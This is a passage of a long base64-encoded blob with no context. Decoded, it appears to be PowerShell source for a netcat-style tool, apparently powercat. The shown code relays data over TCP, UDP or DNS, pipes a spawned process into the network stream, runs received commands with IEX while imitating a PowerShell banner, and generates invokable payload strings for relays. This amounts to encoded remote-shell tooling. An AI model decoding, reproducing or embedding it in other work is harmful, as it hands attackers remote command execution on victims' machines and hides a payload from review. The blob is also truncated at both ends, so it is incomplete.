zcyJdLlN0YW5kYXJkRXJyb3IuQmFzZVN0cmVhbS5CZWdpblJlYWQoJEZ1bmNWYXJzWyJTdGRFcnJEZXN0aW5hdGlvbkJ1ZmZlciJdLCAwLCA2NTUzNiwgJG51bGwsICRudWxsKQogICAgfQogICAgcmV0dXJuICREYXRhLCRGdW5jVmFycwogIH0KICBmdW5jdGlvbiBXcml0ZURhdGFfQ01ECiAgewogICAgcGFyYW0oJERhdGEsJEZ1bmNWYXJzKQogICAgJEZ1bmNWYXJzWyJQcm9jZXNzIl0uU3RhbmRhcmRJbnB1dC5Xcml0ZUxpbmUoJEZ1bmNWYXJzWyJFbmNvZGluZyJdLkdldFN0cmluZygkRGF0YSkuVHJpbUVuZCgiYHIiKS5UcmltRW5kKCJgbiIpKQogICAgcmV0dXJuICRGdW5jVmFycwogIH0KICBmdW5jdGlvbiBDbG9zZV9DTUQKICB7CiAgICBwYXJhbSgkRnVuY1ZhcnMpCiAgICAkRnVuY1ZhcnNbIlByb2Nlc3MiXSB8IFN0b3AtUHJvY2VzcwogIH0gIAogICMjIyMjIyMjIyMgQ01EIEZVTkNUSU9OUyAjIyMjIyMjIyMjCiAgCiAgIyMjIyMjIyMjIyBQT1dFUlNIRUxMIEZVTkNUSU9OUyAjIyMjIyMjIyMjCiAgZnVuY3Rpb24gTWFpbl9Qb3dlcnNoZWxsCiAgewogICAgcGFyYW0oJFN0cmVhbTFTZXR1cFZhcnMpICAgCiAgICB0cnkKICAgIHsKICAgICAgJGVuY29kaW5nID0gTmV3LU9iamVjdCBTeXN0ZW0uVGV4dC5Bc2NpaUVuY29kaW5nCiAgICAgIFtieXRlW11dJElucHV0VG9Xcml0ZSA9IEAoKQogICAgICBpZigkaSAtbmUgJG51bGwpCiAgICAgIHsKICAgICAgICBXcml0ZS1WZXJib3NlICJJbnB1dCBmcm9tIC1pIGRldGVjdGVkLi4uIgogICAgICAgIGlmKFRlc3QtUGF0aCAkaSl7IFtieXRlW11dJElucHV0VG9Xcml0ZSA9IChbaW8uZmlsZV06OlJlYWRBbGxCeXRlcygkaSkpIH0KICAgICAgICBlbHNlaWYoJGkuR2V0VHlwZSgpLk5hbWUgLWVxICJCeXRlW10iKXsgW2J5dGVbXV0kSW5wdXRUb1dyaXRlID0gJGkgfQogICAgICAgIGVsc2VpZigkaS5HZXRUeXBlKCkuTmFtZSAtZXEgIlN0cmluZyIpeyBbYnl0ZVtdXSRJbnB1dFRvV3JpdGUgPSAkRW5jb2RpbmcuR2V0Qnl0ZXMoJGkpIH0KICAgICAgICBlbHNle1dyaXRlLUhvc3QgIlVucmVjb2duaXNlZCBpbnB1dCB0eXBlLiIgOyByZXR1cm59CiAgICAgIH0KICAgIAogICAgICBXcml0ZS1WZXJib3NlICJTZXR0aW5nIHVwIFN0cmVhbSAxLi4uIChFU0MvQ1RSTCB0byBleGl0KSIKICAgICAgdHJ5eyRTdHJlYW0xVmFycyA9IFN0cmVhbTFfU2V0dXAgJFN0cmVhbTFTZXR1cFZhcnN9CiAgICAgIGNhdGNoe1dyaXRlLVZlcmJvc2UgIlN0cmVhbSAxIFNldHVwIEZhaWx1cmUiIDsgYnJlYWt9CiAgICAgIAogICAgICBXcml0ZS1WZXJib3NlICJTZXR0aW5nIHVwIFN0cmVhbSAyLi4uIChFU0MvQ1RSTCB0byBleGl0KSIKICAgICAgdHJ5CiAgICAgIHsKICAgICAgICAkSW50cm9Qcm9tcHQgPSAkRW5jb2RpbmcuR2V0Qnl0ZXMoIldpbmRvd3MgUG93ZXJTaGVsbGBuQ29weXJpZ2h0IChDKSAyMDEzIE1pY3Jvc29mdCBDb3Jwb3JhdGlvbi4gQWxsIHJpZ2h0cyByZXNlcnZlZC5gbmBuIiArICgiUFMgIiArIChwd2QpLlBhdGggKyAiPiAiKSkKICAgICAgICAkUHJvbXB0ID0gKCJQUyAiICsgKHB3ZCkuUGF0aCArICI+ICIpCiAgICAgICAgJENvbW1hbmRUb0V4ZWN1dGUgPSAiIiAgICAgIAogICAgICAgICREYXRhID0gJG51bGwKICAgICAgfQogICAgICBjYXRjaAogICAgICB7CiAgICAgICAgV3JpdGUtVmVyYm9zZSAiU3RyZWFtIDIgU2V0dXAgRmFpbHVyZSIgOyBicmVhawogICAgICB9CiAgICAgIAogICAgICBpZigkSW5wdXRUb1dyaXRlIC1uZSBAKCkpCiAgICAgIHsKICAgICAgICBXcml0ZS1WZXJib3NlICJXcml0aW5nIGlucHV0IHRvIFN0cmVhbSAxLi4uIgogICAgICAgIHRyeXskU3RyZWFtMVZhcnMgPSBTdHJlYW0xX1dyaXRlRGF0YSAkSW5wdXRUb1dyaXRlICRTdHJlYW0xVmFyc30KICAgICAgICBjYXRjaHtXcml0ZS1Ib3N0ICJGYWlsZWQgdG8gd3JpdGUgaW5wdXQgdG8gU3RyZWFtIDEiIDsgYnJlYWt9CiAgICAgIH0KICAgICAgCiAgICAgIGlmKCRkKXtXcml0ZS1WZXJib3NlICItZCAoZGlzY29ubmVjdCkgQWN0aXZhdGVkLiBEaXNjb25uZWN0aW5nLi4uIiA7IGJyZWFrfQogICAgICAKICAgICAgV3JpdGUtVmVyYm9zZSAiQm90aCBDb21tdW5pY2F0aW9uIFN0cmVhbXMgRXN0YWJsaXNoZWQuIFJlZGlyZWN0aW5nIERhdGEgQmV0d2VlbiBTdHJlYW1zLi4uIgogICAgICB3aGlsZSgkVHJ1ZSkKICAgICAgeyAgICAgICAgCiAgICAgICAgdHJ5CiAgICAgICAgewogICAgICAgICAgIyMjIyMgU3RyZWFtMiBSZWFkICMjIyMjCiAgICAgICAgICAkUHJvbXB0ID0gJG51bGwKICAgICAgICAgICRSZXR1cm5lZERhdGEgPSAkbnVsbAogICAgICAgICAgaWYoJENvbW1hbmRUb0V4ZWN1dGUgLW5lICIiKQogICAgICAgICAgewogICAgICAgICAgICB0cnl7W2J5dGVbXV0kUmV0dXJuZWREYXRhID0gJEVuY29kaW5nLkdldEJ5dGVzKChJRVggJENvbW1hbmRUb0V4ZWN1dGUgMj4mMSB8IE91dC1TdHJpbmcpKX0KICAgICAgICAgICAgY2F0Y2h7W2J5dGVbXV0kUmV0dXJuZWREYXRhID0gJEVuY29kaW5nLkdldEJ5dGVzKCgkXyB8IE91dC1TdHJpbmcpKX0KICAgICAgICAgICAgJFByb21wdCA9ICRFbmNvZGluZy5HZXRCeXRlcygoIlBTICIgKyAocHdkKS5QYXRoICsgIj4gIikpCiAgICAgICAgICB9CiAgICAgICAgICAkRGF0YSArPSAkSW50cm9Qcm9tcHQKICAgICAgICAgICRJbnRyb1Byb21wdCA9ICRudWxsCiAgICAgICAgICAkRGF0YSArPSAkUmV0dXJuZWREYXRhCiAgICAgICAgICAkRGF0YSArPSAkUHJvbXB0CiAgICAgICAgICAkQ29tbWFuZFRvRXhlY3V0ZSA9ICIiCiAgICAgICAgICAjIyMjIyBTdHJlYW0yIFJlYWQgIyMjIyMKCiAgICAgICAgICBpZigkRGF0YSAtbmUgJG51bGwpeyRTdHJlYW0xVmFycyA9IFN0cmVhbTFfV3JpdGVEYXRhICREYXRhICRTdHJlYW0xVmFyc30KICAgICAgICAgICREYXRhID0gJG51bGwKICAgICAgICB9CiAgICAgICAgY2F0Y2gKICAgICAgICB7CiAgICAgICAgICBXcml0ZS1WZXJib3NlICJGYWlsZWQgdG8gcmVkaXJlY3QgZGF0YSBmcm9tIFN0cmVhbSAyIHRvIFN0cmVhbSAxIiA7IGJyZWFrCiAgICAgICAgfQogICAgICAgIAogICAgICAgIHRyeQogICAgICAgIHsKICAgICAgICAgICREYXRhLCRTdHJlYW0xVmFycyA9IFN0cmVhbTFfUmVhZERhdGEgJFN0cmVhbTFWYXJzCiAgICAgICAgICBpZigkRGF0YSAtbmUgJG51bGwpeyRDb21tYW5kVG9FeGVjdXRlID0gJEVuY29kaW5nLkdldFN0cmluZygkRGF0YSl9CiAgICAgICAgICAkRGF0YSA9ICRudWxsCiAgICAgICAgfQogICAgICAgIGNhdGNoCiAgICAgICAgewogICAgICAgICAgV3JpdGUtVmVyYm9zZSAiRmFpbGVkIHRvIHJlZGlyZWN0IGRhdGEgZnJvbSBTdHJlYW0gMSB0byBTdHJlYW0gMiIgOyBicmVhawogICAgICAgIH0KICAgICAgfQogICAgfQogICAgZmluYWxseQogICAgewogICAgICB0cnkKICAgICAgewogICAgICAgIFdyaXRlLVZlcmJvc2UgIkNsb3NpbmcgU3RyZWFtIDEuLi4iCiAgICAgICAgU3RyZWFtMV9DbG9zZSAkU3RyZWFtMVZhcnMKICAgICAgfQogICAgICBjYXRjaAogICAgICB7CiAgICAgICAgV3JpdGUtVmVyYm9zZSAiRmFpbGVkIHRvIGNsb3NlIFN0cmVhbSAxIgogICAgICB9CiAgICB9CiAgfQogICMjIyMjIyMjIyMgUE9XRVJTSEVMTCBGVU5DVElPTlMgIyMjIyMjIyMjIwoKICAjIyMjIyMjIyMjIENPTlNPTEUgRlVOQ1RJT05TICMjIyMjIyMjIyMKICBmdW5jdGlvbiBTZXR1cF9Db25zb2xlCiAgewogICAgcGFyYW0oJEZ1bmNTZXR1cFZhcnMpCiAgICAkRnVuY1ZhcnMgPSBAe30KICAgICRGdW5jVmFyc1siRW5jb2RpbmciXSA9IE5ldy1PYmplY3QgU3lzdGVtLlRleHQuQXNjaWlFbmNvZGluZwogICAgJEZ1bmNWYXJzWyJPdXRwdXQiXSA9ICRGdW5jU2V0dXBWYXJzWzBdCiAgICAkRnVuY1ZhcnNbIk91dHB1dEJ5dGVzIl0gPSBbYnl0ZVtdXUAoKQogICAgJEZ1bmNWYXJzWyJPdXRwdXRTdHJpbmciXSA9ICIiCiAgICByZXR1cm4gJEZ1bmNWYXJzCiAgfQogIGZ1bmN0aW9uIFJlYWREYXRhX0NvbnNvbGUKICB7CiAgICBwYXJhbSgkRnVuY1ZhcnMpCiAgICAkRGF0YSA9ICRudWxsCiAgICBpZigkSG9zdC5VSS5SYXdVSS5LZXlBdmFpbGFibGUpCiAgICB7CiAgICAgICREYXRhID0gJEZ1bmNWYXJzWyJFbmNvZGluZyJdLkdldEJ5dGVzKChSZWFkLUhvc3QpICsgImBuIikKICAgIH0KICAgIHJldHVybiAkRGF0YSwkRnVuY1ZhcnMKICB9CiAgZnVuY3Rpb24gV3JpdGVEYXRhX0NvbnNvbGUKICB7CiAgICBwYXJhbSgkRGF0YSwkRnVuY1ZhcnMpCiAgICBzd2l0Y2goJEZ1bmNWYXJzWyJPdXRwdXQiXSkKICAgIHsKICAgICAgIkhvc3QiIHtXcml0ZS1Ib3N0IC1uICRGdW5jVmFyc1siRW5jb2RpbmciXS5HZXRTdHJpbmcoJERhdGEpfQogICAgICAiU3RyaW5nIiB7JEZ1bmNWYXJzWyJPdXRwdXRTdHJpbmciXSArPSAkRnVuY1ZhcnNbIkVuY29kaW5nIl0uR2V0U3RyaW5nKCREYXRhKX0KICAgICAgIkJ5dGVzIiB7JEZ1bmNWYXJzWyJPdXRwdXRCeXRlcyJdICs9ICREYXRhfQogICAgfQogICAgcmV0dXJuICRGdW5jVmFycwogIH0KICBmdW5jdGlvbiBDbG9zZV9Db25zb2xlCiAgewogICAgcGFyYW0oJEZ1bmNWYXJzKQogICAgaWYoJEZ1bmNWYXJzWyJPdXRwdXRTdHJpbmciXSAtbmUgIiIpe3JldHVybiAkRnVuY1ZhcnNbIk91dHB1dFN0cmluZyJdfQogICAgZWxzZWlmKCRGdW5jVmFyc1siT3V0cHV0Qnl0ZXMiXSAtbmUgQCgpKXtyZXR1cm4gJEZ1bmNWYXJzWyJPdXRwdXRCeXRlcyJdfQogICAgcmV0dXJuCiAgfQogICMjIyMjIyMjIyMgQ09OU09MRSBGVU5DVElPTlMgIyMjIyMjIyMjIwogIAogICMjIyMjIyMjIyMgTUFJTiBGVU5DVElPTiAjIyMjIyMjIyMjCiAgZnVuY3Rpb24gTWFpbgogIHsKICAgIHBhcmFtKCRTdHJlYW0xU2V0dXBWYXJzLCRTdHJlYW0yU2V0dXBWYXJzKQogICAgdHJ5CiAgICB7CiAgICAgIFtieXRlW11dJElucHV0VG9Xcml0ZSA9IEAoKQogICAgICAkRW5jb2RpbmcgPSBOZXctT2JqZWN0IFN5c3RlbS5UZXh0LkFzY2lpRW5jb2RpbmcKICAgICAgaWYoJGkgLW5lICRudWxsKQogICAgICB7CiAgICAgICAgV3JpdGUtVmVyYm9zZSAiSW5wdXQgZnJvbSAtaSBkZXRlY3RlZC4uLiIKICAgICAgICBpZihUZXN0LVBhdGggJGkpeyBbYnl0ZVtdXSRJbnB1dFRvV3JpdGUgPSAoW2lvLmZpbGVdOjpSZWFkQWxsQnl0ZXMoJGkpKSB9CiAgICAgICAgZWxzZWlmKCRpLkdldFR5cGUoKS5OYW1lIC1lcSAiQnl0ZVtdIil7IFtieXRlW11dJElucHV0VG9Xcml0ZSA9ICRpIH0KICAgICAgICBlbHNlaWYoJGkuR2V0VHlwZSgpLk5hbWUgLWVxICJTdHJpbmciKXsgW2J5dGVbXV0kSW5wdXRUb1dyaXRlID0gJEVuY29kaW5nLkdldEJ5dGVzKCRpKSB9CiAgICAgICAgZWxzZXtXcml0ZS1Ib3N0ICJVbnJlY29nbmlzZWQgaW5wdXQgdHlwZS4iIDsgcmV0dXJufQogICAgICB9CiAgICAgIAogICAgICBXcml0ZS1WZXJib3NlICJTZXR0aW5nIHVwIFN0cmVhbSAxLi4uIgogICAgICB0cnl7JFN0cmVhbTFWYXJzID0gU3RyZWFtMV9TZXR1cCAkU3RyZWFtMVNldHVwVmFyc30KICAgICAgY2F0Y2h7V3JpdGUtVmVyYm9zZSAiU3RyZWFtIDEgU2V0dXAgRmFpbHVyZSIgOyBicmVha30KICAgICAgCiAgICAgIFdyaXRlLVZlcmJvc2UgIlNldHRpbmcgdXAgU3RyZWFtIDIuLi4iCiAgICAgIHRyeXskU3RyZWFtMlZhcnMgPSBTdHJlYW0yX1NldHVwICRTdHJlYW0yU2V0dXBWYXJzfQogICAgICBjYXRjaHtXcml0ZS1WZXJib3NlICJTdHJlYW0gMiBTZXR1cCBGYWlsdXJlIiA7IGJyZWFrfQogICAgICAKICAgICAgJERhdGEgPSAkbnVsbAogICAgICAKICAgICAgaWYoJElucHV0VG9Xcml0ZSAtbmUgQCgpKQogICAgICB7CiAgICAgICAgV3JpdGUtVmVyYm9zZSAiV3JpdGluZyBpbnB1dCB0byBTdHJlYW0gMS4uLiIKICAgICAgICB0cnl7JFN0cmVhbTFWYXJzID0gU3RyZWFtMV9Xcml0ZURhdGEgJElucHV0VG9Xcml0ZSAkU3RyZWFtMVZhcnN9CiAgICAgICAgY2F0Y2h7V3JpdGUtSG9zdCAiRmFpbGVkIHRvIHdyaXRlIGlucHV0IHRvIFN0cmVhbSAxIiA7IGJyZWFrfQogICAgICB9CiAgICAgIAogICAgICBpZigkZCl7V3JpdGUtVmVyYm9zZSAiLWQgKGRpc2Nvbm5lY3QpIEFjdGl2YXRlZC4gRGlzY29ubmVjdGluZy4uLiIgOyBicmVha30KICAgICAgCiAgICAgIFdyaXRlLVZlcmJvc2UgIkJvdGggQ29tbXVuaWNhdGlvbiBTdHJlYW1zIEVzdGFibGlzaGVkLiBSZWRpcmVjdGluZyBEYXRhIEJldHdlZW4gU3RyZWFtcy4uLiIKICAgICAgd2hpbGUoJFRydWUpCiAgICAgIHsKICAgICAgICB0cnkKICAgICAgICB7CiAgICAgICAgICAkRGF0YSwkU3RyZWFtMlZhcnMgPSBTdHJlYW0yX1JlYWREYXRhICRTdHJlYW0yVmFycwogICAgICAgICAgaWYoJERhdGEgLW5lICRudWxsKXskU3RyZWFtMVZhcnMgPSBTdHJlYW0xX1dyaXRlRGF0YSAkRGF0YSAkU3RyZWFtMVZhcnN9CiAgICAgICAgICAkRGF0YSA9ICRudWxsCiAgICAgICAgfQogICAgICAgIGNhdGNoCiAgICAgICAgewogICAgICAgICAgV3JpdGUtVmVyYm9zZSAiRmFpbGVkIHRvIHJlZGlyZWN0IGRhdGEgZnJvbSBTdHJlYW0gMiB0byBTdHJlYW0gMSIgOyBicmVhawogICAgICAgIH0KICAgICAgICAKICAgICAgICB0cnkKICAgICAgICB7CiAgICAgICAgICAkRGF0YSwkU3RyZWFtMVZhcnMgPSBTdHJlYW0xX1JlYWREYXRhICRTdHJlYW0xVmFycwogICAgICAgICAgaWYoJERhdGEgLW5lICRudWxsKXskU3RyZWFtMlZhcnMgPSBTdHJlYW0yX1dyaXRlRGF0YSAkRGF0YSAkU3RyZWFtMlZhcnN9CiAgICAgICAgICAkRGF0YSA9ICRudWxsCiAgICAgICAgfQogICAgICAgIGNhdGNoCiAgICAgICAgewogICAgICAgICAgV3JpdGUtVmVyYm9zZSAiRmFpbGVkIHRvIHJlZGlyZWN0IGRhdGEgZnJvbSBTdHJlYW0gMSB0byBTdHJlYW0gMiIgOyBicmVhawogICAgICAgIH0KICAgICAgfQogICAgfQogICAgZmluYWxseQogICAgewogICAgICB0cnkKICAgICAgewogICAgICAgICNXcml0ZS1WZXJib3NlICJDbG9zaW5nIFN0cmVhbSAyLi4uIgogICAgICAgIFN0cmVhbTJfQ2xvc2UgJFN0cmVhbTJWYXJzCiAgICAgIH0KICAgICAgY2F0Y2gKICAgICAgewogICAgICAgIFdyaXRlLVZlcmJvc2UgIkZhaWxlZCB0byBjbG9zZSBTdHJlYW0gMiIKICAgICAgfQogICAgICB0cnkKICAgICAgewogICAgICAgICNXcml0ZS1WZXJib3NlICJDbG9zaW5nIFN0cmVhbSAxLi4uIgogICAgICAgIFN0cmVhbTFfQ2xvc2UgJFN0cmVhbTFWYXJzCiAgICAgIH0KICAgICAgY2F0Y2gKICAgICAgewogICAgICAgIFdyaXRlLVZlcmJvc2UgIkZhaWxlZCB0byBjbG9zZSBTdHJlYW0gMSIKICAgICAgfQogICAgfQogIH0KICAjIyMjIyMjIyMjIE1BSU4gRlVOQ1RJT04gIyMjIyMjIyMjIwogIAogICMjIyMjIyMjIyMgR0VORVJBVEUgUEFZTE9BRCAjIyMjIyMjIyMjCiAgaWYoJHUpCiAgewogICAgV3JpdGUtVmVyYm9zZSAiU2V0IFN0cmVhbSAxOiBVRFAiCiAgICAkRnVuY3Rpb25TdHJpbmcgPSAoImZ1bmN0aW9uIFN0cmVhbTFfU2V0dXBgbntgbiIgKyAke2Z1bmN0aW9uOlNldHVwX1VEUH0gKyAiYG59YG5gbiIpCiAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0xX1JlYWREYXRhYG57YG4iICsgJHtmdW5jdGlvbjpSZWFkRGF0YV9VRFB9ICsgImBufWBuYG4iKQogICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMV9Xcml0ZURhdGFgbntgbiIgKyAke2Z1bmN0aW9uOldyaXRlRGF0YV9VRFB9ICsgImBufWBuYG4iKQogICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMV9DbG9zZWBue2BuIiArICR7ZnVuY3Rpb246Q2xvc2VfVURQfSArICJgbn1gbmBuIikgICAgCiAgICBpZigkbCl7JEludm9rZVN0cmluZyA9ICJNYWluIEAoJycsYCRUcnVlLCckcCcsJyR0JykgIn0KICAgIGVsc2V7JEludm9rZVN0cmluZyA9ICJNYWluIEAoJyRjJyxgJEZhbHNlLCckcCcsJyR0JykgIn0KICB9CiAgZWxzZWlmKCRkbnMgLW5lICIiKQogIHsKICAgIFdyaXRlLVZlcmJvc2UgIlNldCBTdHJlYW0gMTogRE5TIgogICAgJEZ1bmN0aW9uU3RyaW5nID0gKCJmdW5jdGlvbiBTdHJlYW0xX1NldHVwYG57YG4iICsgJHtmdW5jdGlvbjpTZXR1cF9ETlN9ICsgImBufWBuYG4iKQogICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMV9SZWFkRGF0YWBue2BuIiArICR7ZnVuY3Rpb246UmVhZERhdGFfRE5TfSArICJgbn1gbmBuIikKICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTFfV3JpdGVEYXRhYG57YG4iICsgJHtmdW5jdGlvbjpXcml0ZURhdGFfRE5TfSArICJgbn1gbmBuIikKICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTFfQ2xvc2VgbntgbiIgKyAke2Z1bmN0aW9uOkNsb3NlX0ROU30gKyAiYG59YG5gbiIpCiAgICBpZigkbCl7cmV0dXJuICJUaGlzIGZlYXR1cmUgaXMgbm90IGF2YWlsYWJsZS4ifQogICAgZWxzZXskSW52b2tlU3RyaW5nID0gIk1haW4gQCgnJGMnLCckcCcsJyRkbnMnLCRkbnNmdCkgIn0KICB9CiAgZWxzZQogIHsKICAgIFdyaXRlLVZlcmJvc2UgIlNldCBTdHJlYW0gMTogVENQIgogICAgJEZ1bmN0aW9uU3RyaW5nID0gKCJmdW5jdGlvbiBTdHJlYW0xX1NldHVwYG57YG4iICsgJHtmdW5jdGlvbjpTZXR1cF9UQ1B9ICsgImBufWBuYG4iKQogICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMV9SZWFkRGF0YWBue2BuIiArICR7ZnVuY3Rpb246UmVhZERhdGFfVENQfSArICJgbn1gbmBuIikKICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTFfV3JpdGVEYXRhYG57YG4iICsgJHtmdW5jdGlvbjpXcml0ZURhdGFfVENQfSArICJgbn1gbmBuIikKICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTFfQ2xvc2VgbntgbiIgKyAke2Z1bmN0aW9uOkNsb3NlX1RDUH0gKyAiYG59YG5gbiIpCiAgICBpZigkbCl7JEludm9rZVN0cmluZyA9ICJNYWluIEAoJycsYCRUcnVlLCRwLCR0KSAifQogICAgZWxzZXskSW52b2tlU3RyaW5nID0gIk1haW4gQCgnJGMnLGAkRmFsc2UsJHAsJHQpICJ9CiAgfQogIAogIGlmKCRlIC1uZSAiIikKICB7CiAgICBXcml0ZS1WZXJib3NlICJTZXQgU3RyZWFtIDI6IFByb2Nlc3MiCiAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX1NldHVwYG57YG4iICsgJHtmdW5jdGlvbjpTZXR1cF9DTUR9ICsgImBufWBuYG4iKQogICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9SZWFkRGF0YWBue2BuIiArICR7ZnVuY3Rpb246UmVhZERhdGFfQ01EfSArICJgbn1gbmBuIikKICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTJfV3JpdGVEYXRhYG57YG4iICsgJHtmdW5jdGlvbjpXcml0ZURhdGFfQ01EfSArICJgbn1gbmBuIikKICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTJfQ2xvc2VgbntgbiIgKyAke2Z1bmN0aW9uOkNsb3NlX0NNRH0gKyAiYG59YG5gbiIpCiAgICAkSW52b2tlU3RyaW5nICs9ICJAKCckZScpYG5gbiIKICB9CiAgZWxzZWlmKCRlcCkKICB7CiAgICBXcml0ZS1WZXJib3NlICJTZXQgU3RyZWFtIDI6IFBvd2Vyc2hlbGwiCiAgICAkSW52b2tlU3RyaW5nICs9ICJgbmBuIgogIH0KICBlbHNlaWYoJHIgLW5lICIiKQogIHsKICAgIGlmKCRyLnNwbGl0KCI6IilbMF0uVG9Mb3dlcigpIC1lcSAidWRwIikKICAgIHsKICAgICAgV3JpdGUtVmVyYm9zZSAiU2V0IFN0cmVhbSAyOiBVRFAiCiAgICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTJfU2V0dXBgbntgbiIgKyAke2Z1bmN0aW9uOlNldHVwX1VEUH0gKyAiYG59YG5gbiIpCiAgICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTJfUmVhZERhdGFgbntgbiIgKyAke2Z1bmN0aW9uOlJlYWREYXRhX1VEUH0gKyAiYG59YG5gbiIpCiAgICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTJfV3JpdGVEYXRhYG57YG4iICsgJHtmdW5jdGlvbjpXcml0ZURhdGFfVURQfSArICJgbn1gbmBuIikKICAgICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9DbG9zZWBue2BuIiArICR7ZnVuY3Rpb246Q2xvc2VfVURQfSArICJgbn1gbmBuIikgICAgCiAgICAgIGlmKCRyLnNwbGl0KCI6IikuQ291bnQgLWVxIDIpeyRJbnZva2VTdHJpbmcgKz0gKCJAKCcnLGAkVHJ1ZSwnIiArICRyLnNwbGl0KCI6IilbMV0gKyAiJywnJHQnKSAiKX0KICAgICAgZWxzZWlmKCRyLnNwbGl0KCI6IikuQ291bnQgLWVxIDMpeyRJbnZva2VTdHJpbmcgKz0gKCJAKCciICsgJHIuc3BsaXQoIjoiKVsxXSArICInLGAkRmFsc2UsJyIgKyAkci5zcGxpdCgiOiIpWzJdICsgIicsJyR0JykgIil9CiAgICAgIGVsc2V7cmV0dXJuICJCYWQgcmVsYXkgZm9ybWF0LiJ9CiAgICB9CiAgICBpZigkci5zcGxpdCgiOiIpWzBdLlRvTG93ZXIoKSAtZXEgImRucyIpCiAgICB7CiAgICAgIFdyaXRlLVZlcmJvc2UgIlNldCBTdHJlYW0gMjogRE5TIgogICAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX1NldHVwYG57YG4iICsgJHtmdW5jdGlvbjpTZXR1cF9ETlN9ICsgImBufWBuYG4iKQogICAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX1JlYWREYXRhYG57YG4iICsgJHtmdW5jdGlvbjpSZWFkRGF0YV9ETlN9ICsgImBufWBuYG4iKQogICAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX1dyaXRlRGF0YWBue2BuIiArICR7ZnVuY3Rpb246V3JpdGVEYXRhX0ROU30gKyAiYG59YG5gbiIpCiAgICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTJfQ2xvc2VgbntgbiIgKyAke2Z1bmN0aW9uOkNsb3NlX0ROU30gKyAiYG59YG5gbiIpCiAgICAgIGlmKCRyLnNwbGl0KCI6IikuQ291bnQgLWVxIDIpe3JldHVybiAiVGhpcyBmZWF0dXJlIGlzIG5vdCBhdmFpbGFibGUuIn0KICAgICAgZWxzZWlmKCRyLnNwbGl0KCI6IikuQ291bnQgLWVxIDQpeyRJbnZva2VTdHJpbmcgKz0gKCJAKCciICsgJHIuc3BsaXQoIjoiKVsxXSArICInLCciICsgJHIuc3BsaXQoIjoiKVsyXSArICInLCciICsgJHIuc3BsaXQoIjoiKVszXSArICInLCRkbnNmdCkgIil9CiAgICAgIGVsc2V7cmV0dXJuICJCYWQgcmVsYXkgZm9ybWF0LiJ9CiAgICB9CiAgICBlbHNlaWYoJHIuc3BsaXQoIjoiKVswXS5Ub0xvd2VyKCkgLWVxICJ0Y3AiKQogICAgewogICAgICBXcml0ZS1WZXJib3NlICJTZXQgU3RyZWFtIDI6IFRDUCIKICAgICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9TZXR1cGBue2BuIiArICR7ZnVuY3Rpb246U2V0dXBfVENQfSArICJgbn1gbmBuIikKICAgICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9SZWFkRGF0YWBue2BuIiArICR7ZnVuY3Rpb246UmVhZERhdGFfVENQfSArICJgbn1gbmBuIikKICAgICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9Xcml0ZURhdGFgbntgbiIgKyAke2Z1bmN0aW9uOldyaXRlRGF0YV9UQ1B9ICsgImBufWBuYG4iKQogICAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX0Nsb3NlYG57YG4iICsgJHtmdW5jdGlvbjpDbG9zZV9UQ1B9ICsgImBufWBuYG4iKQogICAgICBpZigkci5zcGxpdCgiOiIpLkNvdW50IC1lcSAyKXskSW52b2tlU3RyaW5nICs9ICgiQCgnJyxgJFRydWUsJyIgKyAkci5zcGxpdCgiOiIpWzFdICsgIicsJyR0JykgIil9CiAgICAgIGVsc2VpZigkci5zcGxpdCgiOiIpLkNvdW50IC1lcSAzKXskSW52b2tlU3RyaW5nICs9ICgiQCgnIiArICRyLnNwbGl0KCI6IilbMV0gKyAiJyxgJEZhbHNlLCciICsgJHIuc3BsaXQoIjoiKVsyXSArICInLCckdCcpICIpfQogICAgICBlbHNle3JldHVybiAiQmFkIHJlbGF5IGZvcm1hdC4ifQogICAgfQogIH0KICBlbHNlCiAgewogICAgV3JpdGUtVmVyYm9zZSAiU2V0IFN0cmVhbSAyOiBDb25zb2xlIgogICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9TZXR1cGBue2BuIiArICR7ZnVuY3Rpb246U2V0dXBfQ29uc29sZX0gKyAiYG59YG5gbiIpCiAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX1JlYWREYXRhYG57YG4iICsgJHtmdW5jdGlv